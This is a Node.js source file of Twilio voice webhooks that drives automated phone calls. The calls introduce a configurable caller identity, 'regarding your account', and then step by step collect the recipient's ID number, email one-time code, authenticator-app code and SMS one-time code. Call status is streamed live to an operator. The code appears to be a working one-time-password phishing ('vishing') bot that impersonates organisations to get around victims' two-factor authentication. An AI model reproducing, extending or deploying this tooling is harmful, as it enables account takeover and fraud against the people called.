const express = require('express');
const router = express.Router();
const VoiceResponse = require('twilio').twiml.VoiceResponse;
const db = require('../database/db');

router.get('/test', (req, res) => {
    res.send('Webhook is working! Server is online.');
});

router.post('/voice-response/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const twiml = new VoiceResponse();
    const io = req.app.get('io');

    try {
        // Fetch session and contact data
        const sessionResult = await db.query(
            `SELECT cs.*, c.full_name 
             FROM call_sessions cs
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cs.id = $1`,
            [sessionId]
        );

        if (sessionResult.rows.length === 0) {
            console.log(`[ERROR] Session ${sessionId} not found.`);
            twiml.say('Session not found. Goodbye.');
            twiml.hangup();
            return res.type('text/xml').send(twiml.toString());
        }

        const callData = sessionResult.rows[0];
        const currentAction = callData.current_action;
        const fullName = callData.full_name;
        const subject = callData.subject;
        const customIntro = callData.custom_intro;

        console.log(`[INFO] Session ${sessionId}: Current action = ${currentAction}`);

        // --- Handle Initial Call (Consent) ---
        if (currentAction === 'consent') {
            const gather = twiml.gather({
                numDigits: 1,
                action: `/webhooks/handle-consent/${sessionId}`,
                method: 'POST',
                timeout: 10
            });

            const greeting = fullName ? `Hello ${fullName}, ` : 'Hello our valued client, ';
            const introMessage = subject && customIntro ? customIntro : (subject ? `This is ${subject} calling. ` : 'We are contacting you regarding your account. ');
            gather.say(`${greeting}${introMessage} Press 1 to continue.`);
            twiml.say('We did not receive any input. Goodbye.');
            twiml.hangup();
        }
        // --- Handle Request for ID (After Consent) ---
        else if (currentAction === 'waiting_for_id') {
            const gather = twiml.gather({
                numDigits: 20,
                action: `/webhooks/collect-id/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter your ID number followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
        }
        // --- Handle Request for Email OTP (Second Request) ---
        else if (currentAction === 'waiting_for_email_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-email-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6-digit OTP from your email followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
        }
        // --- Handle Request for Auth OTP (Second Request) ---
        else if (currentAction === 'waiting_for_auth_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-auth-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6-digit code from your authenticator app followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
        }
        // --- Handle Request for Phone OTP (Second Request) ---
        else if (currentAction === 'waiting_for_phone_otp') {
            const gather = twiml.gather({
                numDigits: 6,
                action: `/webhooks/collect-phone-otp/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say('Please enter the 6-digit OTP sent to your phone followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
        }
        // --- Handle Hold Music ---
        else if (currentAction === 'playing_music') {
            twiml.enqueue('W5a624d099ac7a6f8f2355f299470979773', {
                action: `/webhooks/leave-queue/${sessionId}`,
                method: 'POST'
            });
        }
        // --- Handle Custom Voice ---
        else if (currentAction === 'custom_voice') {
            const customMessage = callData.custom_message;
            const gather = twiml.gather({
                numDigits: 20,
                action: `/webhooks/collect-custom/${sessionId}`,
                method: 'POST',
                finishOnKey: '#',
                timeout: 10
            });
            gather.say(customMessage || 'Please enter your response followed by the pound key.');
            twiml.say('No input received. Goodbye.');
            twiml.hangup();
        }
        // --- Fallback for unknown state ---
        else {
            console.log(`[WARN] Session ${sessionId}: Unknown action '${currentAction}'. Defaulting to hangup.`);
            twiml.say('Please wait for an agent. Goodbye.');
            twiml.hangup();
        }

        res.type('text/xml');
        res.send(twiml.toString());

    } catch (error) {
        console.error(`[FATAL] Error in voice-response for session ${sessionId}:`, error);
        const errorTwiml = new VoiceResponse();
        errorTwiml.say('A critical system error occurred. Goodbye.');
        errorTwiml.hangup();
        res.type('text/xml').status(500).send(errorTwiml.toString());
    }
});

// --- Keep the rest of your existing routes (handle-consent, collect-id, collect-email-otp, etc.) exactly as they were in the last working version ---
// ... (Please re-add your existing routes for handle-consent, collect-id, etc. from the previous working webhooks.js) ...

router.post('/call-status/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const { CallStatus, Duration } = req.body;
    const io = req.app.get('io');

    if (sessionId) {
        await db.query(
            `UPDATE call_sessions SET status = $1, duration_seconds = $2 WHERE id = $3`,
            [CallStatus, Duration || 0, sessionId]
        );
        io.emit('call_status', { session_id: sessionId, status: CallStatus, duration: Duration });
    }

    res.sendStatus(200);
});

module.exports = router;
